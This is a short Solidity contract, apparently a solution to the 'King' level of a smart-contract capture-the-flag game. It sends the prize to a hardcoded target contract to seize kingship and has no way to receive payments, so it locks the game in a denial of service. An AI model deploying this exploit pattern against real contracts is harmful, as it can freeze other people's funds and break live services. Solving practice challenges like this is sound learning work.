// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../src/King.sol';

contract KingScript {
  King target = King(payable(0xa743e13003f545A2740d988E89169739D6da422f));

  constructor() payable {
    address(target).call{value: target.prize()}("");
  }
}
